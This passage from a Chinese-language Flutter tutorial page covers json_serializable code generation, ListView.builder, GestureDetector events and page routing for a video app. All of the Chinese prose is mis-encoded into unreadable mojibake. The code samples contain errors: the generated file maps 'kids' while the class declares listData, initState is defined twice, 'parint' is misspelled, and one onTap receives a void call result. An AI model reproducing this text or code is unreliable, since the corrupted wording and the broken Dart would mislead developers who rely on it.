build_runner ** å»ç”Ÿæˆdartä»£ç ï¼Œ** build_runner **æ˜¯dartå›¢é˜Ÿæä¾›çš„ä¸€ä¸ªç”Ÿæˆdartä»£ç æ–‡ä»¶çš„å¤–éƒ¨åŒ…ã€‚</p><p>å½“å‰é¡¹ç›®çš„ç›®å½•ä¸‹è¿è¡Œ</p><blockquote><p>flutter packages pub run build_runner build</p></blockquote><p>è¿è¡ŒæˆåŠŸåï¼Œå°±å¯ä»¥åœ¨æˆ‘ä»¬çš„modelå®ä½“ç±»ä¸‹é¢çœ‹è§ä¸€ä¸ªå« ** Data.g.dart ** çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GENERATED CODE - DO NOT MODIFY BY HAND</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">part</span> of <span class="string">&#x27;data.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// **************************************************************************</span></span><br><span class="line"><span class="comment">// JsonSerializableGenerator</span></span><br><span class="line"><span class="comment">// **************************************************************************</span></span><br><span class="line"></span><br><span class="line">Data _$DataFromJson(<span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; json) &#123;</span><br><span class="line">  <span class="keyword">return</span> Data(</span><br><span class="line">      id: json[<span class="string">&#x27;id&#x27;</span>] <span class="keyword">as</span> <span class="built_in">int</span>,</span><br><span class="line">      kids: (json[<span class="string">&#x27;kids&#x27;</span>] <span class="keyword">as</span> <span class="built_in">List</span>)?.map((e) =&gt; e <span class="keyword">as</span> <span class="built_in">int</span>)?.toList(),</span><br><span class="line">      score: json[<span class="string">&#x27;score&#x27;</span>] <span class="keyword">as</span> <span class="built_in">int</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; _$DataToJson(Data instance) =&gt; &lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt;&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: instance.id,</span><br><span class="line">      <span class="string">&#x27;kids&#x27;</span>: instance.kids,</span><br><span class="line">      <span class="string">&#x27;score&#x27;</span>: instance.score</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨é‡Š ** GENERATED CODE - DO NOT MODIFY BY HANDâ€ **, æ„æ€æ˜¯ä¸è¦æ‰‹å†™ç”Ÿæˆè¿™ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨æ ¹æ®å»è§£å†³ã€‚</p></blockquote><h4 id="å…³è”å®ä½“ç±»æ–‡ä»¶"><a href="#å…³è”å®ä½“ç±»æ–‡ä»¶" class="headerlink" title="å…³è”å®ä½“ç±»æ–‡ä»¶"></a>å…³è”å®ä½“ç±»æ–‡ä»¶</h4><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:json_annotation/json_annotation.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">part</span> <span class="string">&#x27;data.g.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@JsonSerializable</span>()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span></span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">int</span> id;</span><br><span class="line">    <span class="meta">@JsonKey</span>(name: <span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; listData;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">int</span> score;</span><br><span class="line"></span><br><span class="line">    Data(&#123;<span class="keyword">this</span>.id, <span class="keyword">this</span>.listData, <span class="keyword">this</span>.score&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">factory</span> Data.fromJson(<span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; json) =&gt; _$DataFromJson(json);</span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; toJson() =&gt; _$DataToJson(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ListView-ç»„ä»¶"><a href="#ListView-ç»„ä»¶" class="headerlink" title="ListView ç»„ä»¶"></a>ListView ç»„ä»¶</h3><p>åœ¨Flutterä¸­,ç”¨ListViewæ¥æ˜¾ç¤ºåˆ—è¡¨é¡¹,æ”¯æŒå‚ç›´å’Œæ°´å¹³æ–¹å‘å±•ç¤º,é€šè¿‡ä¸€ä¸ªå±æ€§æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶å…¶æ–¹å‘ï¼Œåœ¨è¿™é‡Œåªåšå¤§æ•°æ®çš„æ¸²æŸ“ä»‹ç»ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/httpUtil.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/Api.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/model/videos.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomePage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  _HomePageState createState() =&gt; _HomePageState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_HomePageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">HomePage</span>&gt; </span>&#123;</span><br><span class="line">    HttpUtil httpUtil = <span class="keyword">new</span> HttpUtil();</span><br><span class="line">    <span class="built_in">List</span>&lt;<span class="built_in">dynamic</span>&gt; _videosList = <span class="keyword">new</span> <span class="built_in">List</span>(); <span class="comment">// è§†é¢‘åˆ—è¡¨æ•°æ®</span></span><br><span class="line">    <span class="built_in">int</span> _pageNo = <span class="number">0</span>; <span class="comment">// å¼€å§‹é¡µ</span></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            home: <span class="keyword">new</span> Scaffold(</span><br><span class="line">                appBar: AppBar(</span><br><span class="line">                    title: Text(</span><br><span class="line">                        <span class="string">&quot;é¹°çœ¼è§†é¢‘&quot;</span>,</span><br><span class="line">                        style: <span class="keyword">new</span> TextStyle(fontSize: <span class="number">20.0</span>, letterSpacing: <span class="number">3.0</span>),</span><br><span class="line">                    ),</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// è¿™æ˜¯listView å®ç° å¤§æ•°æ®æ¸²æŸ“çš„ æ–¹æ³•</span></span><br><span class="line">                body: <span class="keyword">new</span> ListView.builder(</span><br><span class="line">                    itemCount: _videosList.length,</span><br><span class="line">                    itemBuilder: <span class="keyword">this</span>._buildRow,</span><br><span class="line">                ),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// listView å­é¡¹ itemBuilder buildæ–¹æ³• ä¼ å…¥2ä¸ªå‚æ•°ï¼Œ( context ä¸Šä¸‹æ–‡, position ä¸‹æ ‡ - è®¡æ•°å™¨)</span></span><br><span class="line">    Widget _buildRow(BuildContext context, <span class="built_in">int</span> position) &#123;</span><br><span class="line">        <span class="built_in">print</span>(_videosList[position].toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Card(</span><br><span class="line">            margin: EdgeInsets.only(bottom: <span class="number">38.0</span>),</span><br><span class="line">            child: <span class="keyword">new</span> Container(</span><br><span class="line">                height: <span class="number">256.0</span>,</span><br><span class="line">                child: <span class="keyword">this</span>._buildImage(_videosList[position][<span class="string">&#x27;img&#x27;</span>])</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">        _getContent(_pageNo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·å–ç½‘ç»œæ•°æ®</span></span><br><span class="line">    <span class="keyword">void</span> _getContent(pageNo) <span class="keyword">async</span> &#123;</span><br><span class="line">        <span class="built_in">String</span> url = Api.VideList;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;<span class="string">&#x27;page&#x27;</span>: pageNo&#125;;</span><br><span class="line">        <span class="keyword">var</span> response = <span class="keyword">await</span> HttpUtil().<span class="keyword">get</span>(url, data: data);</span><br><span class="line">        Videos videos = Videos.fromJson(response);</span><br><span class="line">        <span class="keyword">if</span> (videos.code == <span class="number">0</span>) &#123;</span><br><span class="line">            setState(() &#123;</span><br><span class="line">                _videosList.addAll(videos.data.listData);</span><br><span class="line">                _pageNo = pageNo + <span class="number">1</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»‹ç»äº† å¦‚ä½•http è·å–æ•°æ®ï¼Œå¹¶ä¸”æŠŠjsonæ•°æ®æ˜ å°„åˆ°modelå®ä½“ç±»ã€‚å…¶å®listViewæœ€ä¸»è¦çš„å°±æ˜¯ï¼Œåšå¤§æ•°æ®æ¸²æŸ“ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ListView æ ¸å¿ƒ</span></span><br><span class="line"><span class="keyword">new</span> ListView.builder(</span><br><span class="line">    itemCount: _videosList.length,</span><br><span class="line">    itemBuilder: <span class="keyword">this</span>._buildRow,</span><br><span class="line">),</span><br><span class="line"></span><br><span class="line">itemCount: è¡¨ç¤ºåˆ—è¡¨é¡¹çš„æ€»æ•°ã€‚</span><br><span class="line">itemBuilderï¼š æ¸²æŸ“å­é¡¹çš„æ–¹æ³•ï¼Œä½¿å…¶liståˆ—è¡¨ä¸­æ˜¾ç¤ºä¸åŒçš„ç»„ä»¶ç•Œé¢ã€‚</span><br></pre></td></tr></table></figure><h3 id="GestureDetector-æ‰‹åŠ¿"><a href="#GestureDetector-æ‰‹åŠ¿" class="headerlink" title="GestureDetector æ‰‹åŠ¿"></a>GestureDetector æ‰‹åŠ¿</h3><p>GestureDetector æ‰‹åŠ¿æ§ä»¶æ²¡æœ‰å›¾åƒå±•ç¤ºï¼Œåªæ˜¯æ£€æµ‹ç”¨æˆ·è¾“å…¥çš„æ‰‹åŠ¿ã€‚å½“ç”¨æˆ·ç‚¹å‡»Containeræ—¶ï¼ŒGestureDetectorä¼šè°ƒç”¨onTapå›è°ƒã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨GestureDetectoræ£€æµ‹å„ç§è¾“å…¥æ‰‹åŠ¿ï¼ŒåŒ…æ‹¬ç‚¹å‡»ã€æ‹–åŠ¨å’Œç¼©æ”¾ã€‚ä¸è¿‡ä¹Ÿæœ‰è®¸å¤šçš„æ§ä»¶ä½¿ç”¨GestureDetectorä¸ºå…¶ä»–æ§ä»¶æä¾›å›è°ƒï¼Œæ¯”å¦‚IconButtonã€RaisedButtonå’ŒFloatingActionButtonæ§ä»¶æœ‰onPressedå›è°ƒï¼Œå½“ç”¨æˆ·ç‚¹å‡»æ§ä»¶æ—¶è§¦å‘å›è°ƒã€‚</p><h4 id="æ‰‹åŠ¿äº‹ä»¶"><a href="#æ‰‹åŠ¿äº‹ä»¶" class="headerlink" title="æ‰‹åŠ¿äº‹ä»¶"></a>æ‰‹åŠ¿äº‹ä»¶</h4><table><thead><tr><th>å±æ€§/å›è°ƒ</th><th>æè¿°</th></tr></thead><tbody><tr><td>onTapDown</td><td>æ¯æ¬¡ç”¨æˆ·ä¸å±å¹•è”ç³»æ—¶éƒ½ä¼šè§¦å‘ OnTapDown</td></tr><tr><td>onTapUp</td><td>å½“ç”¨æˆ·åœæ­¢è§¦æ‘¸å±å¹•æ—¶ï¼ŒonTapUp è¢«è°ƒç”¨</td></tr><tr><td>onTap</td><td>å½“çŸ­æš‚è§¦æ‘¸å±å¹•æ—¶ï¼ŒonTap è¢«è§¦å‘</td></tr><tr><td>onTapCancel</td><td>å½“ç”¨æˆ·è§¦æ‘¸å±å¹•ä½†æœªå®Œæˆ Tap æ—¶ï¼Œå°†è§¦å‘æ­¤äº‹ä»¶</td></tr><tr><td>onDoubleTap</td><td>å½“å±å¹•è¢«å¿«é€Ÿè¿ç»­è§¦æ‘¸ä¸¤æ¬¡æ—¶è°ƒç”¨ onDoubleTap</td></tr><tr><td>onLongPress</td><td>ç”¨æˆ·è§¦æ‘¸å±å¹•è¶…è¿‡ 500æ¯«ç§’ æ—¶ï¼ŒonLongPress è¢«è§¦å‘</td></tr><tr><td>onVerticalDragDown</td><td>å½“æŒ‡é’ˆä¸å±å¹•æ¥è§¦å¹¶å¼€å§‹æ²¿å‚ç›´æ–¹å‘ç§»åŠ¨æ—¶ï¼ŒonVerticalDown è¢«è°ƒç”¨</td></tr><tr><td>onVerticalDragStart</td><td>å½“æŒ‡é’ˆ å¼€å§‹ æ²¿å‚ç›´æ–¹å‘ç§»åŠ¨æ—¶è°ƒç”¨ onVerticalDragStart</td></tr><tr><td>onVerticalDragUpdate</td><td>æ¯æ¬¡æŒ‡é’ˆåœ¨å±å¹•ä¸Šçš„ä½ç½®å‘ç”Ÿå˜åŒ–æ—¶éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•</td></tr><tr><td>onVerticalDragEnd</td><td>å½“ç”¨æˆ·åœæ­¢ç§»åŠ¨æ—¶ï¼Œæ‹–åŠ¨è¢«è®¤ä¸ºæ˜¯å®Œæˆçš„ï¼Œå°†è°ƒç”¨æ­¤äº‹ä»¶</td></tr><tr><td>onVerticalDragCancel</td><td>å½“ç”¨æˆ·çªç„¶åœæ­¢æ‹–åŠ¨æ—¶è°ƒç”¨</td></tr><tr><td>onHorizontalDragDown</td><td>å½“ç”¨æˆ·/æŒ‡é’ˆä¸å±å¹•æ¥è§¦å¹¶å¼€å§‹æ°´å¹³ç§»åŠ¨æ—¶è°ƒç”¨</td></tr><tr><td>onHorizontalDragStart</td><td>ç”¨æˆ·/æŒ‡é’ˆå·²ä¸å±å¹•æ¥è§¦å¹¶ å¼€å§‹ æ²¿æ°´å¹³æ–¹å‘ç§»åŠ¨</td></tr><tr><td>onHorizontalDragUpdate</td><td>æ¯æ¬¡æŒ‡é’ˆåœ¨æ°´å¹³æ–¹å‘/xè½´ä¸Šçš„ä½ç½®å‘ç”Ÿå˜åŒ–æ—¶è°ƒç”¨</td></tr><tr><td>onHorizontalDragEnd</td><td>åœ¨æ°´å¹³æ‹–åŠ¨ç»“æŸæ—¶ï¼Œå°†è°ƒç”¨æ­¤äº‹ä»¶</td></tr><tr><td>onHorizontalDragCancel</td><td>å½“æŒ‡é’ˆæœªæˆåŠŸè§¦å‘ onHorizontalDragDown æ—¶è°ƒç”¨</td></tr><tr><td>onPanDown</td><td>å½“æŒ‡é’ˆä¸å±å¹•æ¥è§¦æ—¶è°ƒç”¨</td></tr><tr><td>onPanStart</td><td>æŒ‡é’ˆäº‹ä»¶å¼€å§‹ç§»åŠ¨æ—¶ï¼ŒonPanStart è§¦å‘</td></tr><tr><td>onPanUpdate</td><td>æ¯æ¬¡æŒ‡é’ˆæ”¹å˜ä½ç½®æ—¶ï¼Œè°ƒç”¨ onPanUpdate</td></tr><tr><td>onPanEnd</td><td>å¹³ç§»å®Œæˆåï¼Œå°†è°ƒç”¨æ­¤äº‹ä»¶</td></tr><tr><td>onScaleStart</td><td>å½“æŒ‡é’ˆä¸å±å¹•æ¥è§¦å¹¶å»ºç«‹ 1.0 çš„ç„¦ç‚¹æ—¶ï¼Œå°†è°ƒç”¨æ­¤äº‹ä»¶</td></tr><tr><td>onScaleUpdate</td><td>ä¸å±å¹•æ¥è§¦çš„æŒ‡é’ˆæŒ‡ç¤ºäº†æ–°çš„ç„¦ç‚¹</td></tr><tr><td>onScaleEnd</td><td>å½“æŒ‡é’ˆä¸å†ä¸æŒ‡ç¤ºæ‰‹åŠ¿ç»“æŸçš„å±å¹•æ¥è§¦æ—¶è°ƒç”¨</td></tr></tbody></table><h4 id="onTap-äº‹å’§"><a href="#onTap-äº‹å’§" class="headerlink" title="onTap äº‹å’§"></a>onTap äº‹å’§</h4><p>è¿™é‡Œä»¥onTapæ‰‹åŠ¿äº‹ä»¶ï¼Œä¸ºä¾‹ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¼ å‚æ•°çš„æ‰‹åŠ¿ã€‚</span></span><br><span class="line"><span class="keyword">new</span> GestureDetector(</span><br><span class="line">    child:Container(</span><br><span class="line">        width: <span class="built_in">double</span>.infinity,</span><br><span class="line">        height: <span class="number">200.0</span>,</span><br><span class="line">        child: <span class="keyword">this</span>._buildImage(_videosList[position][<span class="string">&#x27;img&#x27;</span>]), <span class="comment">// è¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„å›¾ç‰‡ç»„ä»¶</span></span><br><span class="line">    ),</span><br><span class="line">    onTap: <span class="keyword">this</span>._videoPlayToggle(_videosList[position][<span class="string">&#x27;id&#x27;</span>]), <span class="comment">// è¿™é‡Œæ˜¯ç‚¹å‡»å›¾ç‰‡è§¦å‘çš„äº‹ä»¶ï¼Œå¹¶ä¸”ä¼ å…¥ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">),</span><br><span class="line"></span><br><span class="line"><span class="built_in">Function</span> _videoPlayToggle(id) &#123;</span><br><span class="line">    <span class="keyword">return</span> () =&gt; parint(<span class="string">&#x27;æˆ‘æ˜¯onTabäº‹ä»¶ï¼Œå‚æ•° <span class="subst">$id</span>&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸ä¼ å‚æ•°çš„æ‰‹åŠ¿ã€‚</span></span><br><span class="line"><span class="keyword">new</span> GestureDetector(</span><br><span class="line">    child:Container(</span><br><span class="line">        width: <span class="built_in">double</span>.infinity,</span><br><span class="line">        height: <span class="number">200.0</span>,</span><br><span class="line">        child: Text(<span class="string">&#x27;æ— å‚æ•°&#x27;</span>), <span class="comment">// è¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„å›¾ç‰‡ç»„ä»¶</span></span><br><span class="line">    ),</span><br><span class="line">    onTap: <span class="keyword">this</span>._videoPlayToggle(), <span class="comment">// è¿™é‡Œæ˜¯ç‚¹å‡»å›¾ç‰‡è§¦å‘çš„äº‹ä»¶ï¼Œå¹¶ä¸”ä¼ å…¥ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">),</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _videoPlayToggle() &#123;</span><br><span class="line">    parint(<span class="string">&#x27;æˆ‘æ˜¯onTabäº‹ä»¶ï¼Œæ— å‚æ•°&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è·¯ç”±å¯¼èˆª"><a href="#è·¯ç”±å¯¼èˆª" class="headerlink" title="è·¯ç”±å¯¼èˆª"></a>è·¯ç”±å¯¼èˆª</h3><p>åœ¨ä¸ŠèŠ‚æ‰‹åŠ¿ä»‹ç»æ–‡ç« ä¸­ä»‹ç»äº†onTabäº‹ä»¶ï¼Œé‚£ä¹ˆç°åœ¨æˆ‘ä»¬å°±çœ‹çœ‹appåº”ç”¨çš„å¤šé¡µé¢åˆ‡æ¢å§ã€‚çœ‹çœ‹Flutterçš„é¡µé¢åˆ‡æ¢ä¸ ** React-router ** æœ‰ä»€ä¹ˆä¸ä¸€æ ·ã€‚</p><p>åœ¨Flutterä¸­æœ‰ç€ä¸¤ç§è·¯ç”±è·³è½¬çš„æ–¹å¼ï¼Œä¸€ç§æ˜¯é™æ€è·¯ç”±ï¼Œåœ¨åˆ›å»ºæ—¶å°±å·²ç»æ˜ç¡®çŸ¥é“äº†è¦è·³è½¬çš„é¡µé¢å’Œå€¼ã€‚å¦ä¸€ç§æ˜¯åŠ¨æ€è·¯ç”±ï¼Œè·³è½¬ä¼ å…¥çš„ç›®æ ‡åœ°å€å’Œè¦ä¼ å…¥çš„å€¼éƒ½å¯ä»¥æ˜¯åŠ¨æ€çš„ã€‚</p><h4 id="é™æ€è·¯ç”±"><a href="#é™æ€è·¯ç”±" class="headerlink" title="é™æ€è·¯ç”±"></a>é™æ€è·¯ç”±</h4><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/page/homePage.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/page/aboutPage.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main()=&gt;runApp(<span class="keyword">new</span> RootPage());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RootPage</span> <span class="keyword">extends</span> <span class="title">StatelessWidget</span> </span>&#123;</span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            title: <span class="string">&#x27;é¹°çœ¼è§†é¢‘&#x27;</span>,</span><br><span class="line">            home: <span class="keyword">new</span> HomePage(),</span><br><span class="line">            routes: &lt;<span class="built_in">String</span>, WidgetBuilder&gt;&#123;</span><br><span class="line">                <span class="string">&#x27;/aboutPage&#x27;</span>: (BuildContext context) =&gt; <span class="keyword">new</span> AboutPage() <span class="comment">// é™æ€è·¯ç”±é…ç½®</span></span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨MaterialAppä¸­ï¼Œæ˜¯å­˜åœ¨ä¸€ä¸ªå«routersçš„å‚æ•°çš„ï¼Œç”¨äºé…ç½®é™æ€è·¯ç”±ã€‚</p><h4 id="åŠ¨æ€è·¯ç”±"><a href="#åŠ¨æ€è·¯ç”±" class="headerlink" title="åŠ¨æ€è·¯ç”±"></a>åŠ¨æ€è·¯ç”±</h4><p>åœ¨æ‰‹åŠ¿çš„å°èŠ‚ä¸­è®²è§£äº†ï¼Œå¦‚ä½•å»ä½¿ç”¨æ‰‹åŠ¿äº‹ä»¶ã€‚é‚£ä¹ˆè¿™èŠ‚ç»§ç»­æ‰©å……ã€‚ç‚¹å‡»äº‹ä»¶åï¼Œè®©å…¶æºå¸¦å‚æ•°åˆ‡æ¢é¡µé¢ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span> _videoPlayToggle(id) &#123; <span class="comment">// è¿™é‡Œæ¥æ”¶çš„æ˜¯ï¼Œäº‹ä»¶ä¼ é€’çš„å‚æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">return</span> () =&gt; Navigator.of(context).push(</span><br><span class="line">        <span class="keyword">new</span> PageRouteBuilder(</span><br><span class="line">            pageBuilder: (BuildContext context,</span><br><span class="line">                Animation&lt;<span class="built_in">double</span>&gt; animation, <span class="comment">// åˆ‡æ¢çš„åŠ¨ç”»ã€‚</span></span><br><span class="line">                Animation&lt;<span class="built_in">double</span>&gt; secondaryAnimation) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> DetailsPage(id.toString()); <span class="comment">// è¿™é‡Œè´Ÿè´£æŠŠäº‹ä»¶å‚æ•°ï¼Œä¼ é€’åˆ°ä¸‹ä¸€ä¸ªé¡µé¢ã€‚</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åŸåˆ™å°±æ˜¯ï¼šâ€œç®€å•çš„å­¦ä¹ ï¼Œå¿«é€Ÿçš„æŒæ¡â€ã€‚è‡³äºåŠ¨ç”»æ•ˆæœï¼Œåç»­ä¼˜åŒ–ã€‚å…ˆè·‘ä¸‹æ¡†æ¶ç»“æ„ï¼</p><blockquote><p>ä¸‹ä¸€ä¸ªé¡µé¢çš„ï¼Œå‚æ•°æ¥æ”¶ã€‚</p></blockquote><p>å…¶å®å°±æ˜¯ï¼Œé€šè¿‡æ„é€ æ–¹æ³•å®ä¾‹è¯å¯¹è±¡æ—¶ä¼ è¿›å»ã€‚å°±æ˜¯è¿™ä¹ˆç®€å•ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 